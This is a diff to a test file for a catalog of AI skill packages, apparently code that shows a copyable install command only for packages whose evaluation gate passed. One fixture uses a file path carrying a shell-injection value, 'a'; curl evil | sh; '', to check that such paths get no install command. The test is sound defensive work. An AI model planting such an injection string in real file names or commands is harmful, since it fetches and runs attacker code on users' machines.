@@ -121,11 +121,9 @@ publish:
 
     const skill = entities[0];
     expect(isInstallable(skill)).toBe(false);
-    // A command still exists: the gate is the score, not the absence of a
-    // command, and the panel needs something to show once it is scored.
-    expect(readInstallCommands(skill).claude).toContain(
-      `ainb skill install 'gh:wololo-labs/estate@${SHA}/skills/lonely'`,
-    );
+    // The gate is enforced here, not only in the UI: no passing score, no
+    // command to copy.
+    expect(readInstallCommands(skill)).toEqual({});
   });
 
   it('gives a pack its score and gives its members the same score and command', async () => {
@@ -266,6 +264,47 @@ publish:
     });
     expect(scoreState(readEvalScore(entities[0]))).toBe('regressed');
     expect(isInstallable(entities[0])).toBe(false);
+  });
+
+  describe('which scores get an install command at all', () => {
+    const commandsFor = async (report?: object) => {
+      const { entities } = await buildEntities({
+        repo: REPO,
+        commitSha: SHA,
+        manifest: parseManifest(
+          'owner: team\npublish:\n  packages: packages/*/apm.yml\n  skills: packages/*/.apm/skills/*/SKILL.md\n',
+        ),
+        ...repository({
+          'packages/p/apm.yml': 'name: p\nversion: 0.1.0\n',
+          'packages/p/.apm/skills/s/SKILL.md': '---\ndescription: d\n---\n',
+          ...(report
+            ? { 'packages/p/eval-gate-report.json': JSON.stringify(report) }
+            : {}),
+        }),
+      });
+      return [find(entities, 'System', 'p')!, find(entities, 'AiResource', 's')!].map(
+        e => readInstallCommands(e),
+      );
+    };
+
+    it.each([
+      ['a regression', { verdict: 'regression', signals: [] }],
+      ['a failed gate', { verdict: 'refused', signals: [] }],
+      ['no report at all', undefined],
+    ])('publishes no command for %s, so the block is not only in the UI', async (_, report) => {
+      for (const commands of await commandsFor(report)) {
+        expect(commands).toEqual({});
+      }
+    });
+
+    it.each([
+      ['a pass with no gain', { verdict: 'pass', signals: [] }],
+      ['a measured gain', { verdict: 'pass', signals: [], stats: { significant_improvement: true } }],
+    ])('publishes the commands for %s', async (_, report) => {
+      for (const commands of await commandsFor(report)) {
+        expect(Object.keys(commands)).toContain('claude');
+      }
+    });
   });
 
   describe('the commit a score was measured at', () => {
@@ -460,27 +499,28 @@ publish:
   });
 
   it('publishes no install command for a path that could break its own quoting', async () => {
+    const passing = JSON.stringify({ verdict: 'pass', signals: [] });
     const { entities } = await buildEntities({
       repo: REPO,
       commitSha: SHA,
       manifest: parseManifest(
-        "owner: team\npublish:\n  skills: 'skills/*/SKILL.md'\n",
+        "owner: team\npublish:\n  packages: 'packages/*/apm.yml'\n",
       ),
       ...repository({
-        "skills/a'; curl evil | sh; '/SKILL.md": '---\ndescription: hostile\n---\n',
-        'skills/honest/SKILL.md': '---\ndescription: fine\n---\n',
+        "packages/a'; curl evil | sh; '/apm.yml": 'name: hostile\nversion: 0.1.0\n',
+        "packages/a'; curl evil | sh; '/eval-gate-report.json": passing,
+        'packages/honest/apm.yml': 'name: fine\nversion: 0.1.0\n',
+        'packages/honest/eval-gate-report.json': passing,
       }),
     });
 
-    const hostile = entities.find(e => e.metadata.description === 'hostile')!;
+    const hostile = find(entities, 'System', 'hostile')!;
     // Browsable and readable, but nothing to paste into a shell.
     expect(hostile).toBeDefined();
     expect(readInstallCommands(hostile)).toEqual({});
-    expect(
-      readInstallCommands(
-        entities.find(e => e.metadata.description === 'fine')!,
-      ).claude,
-    ).toContain('ainb skill install');
+    expect(readInstallCommands(find(entities, 'System', 'fine')!).claude).toContain(
+      'apm install',
+    );
   });
 
   it('reports a repository with zero assets rather than losing it', async () => {
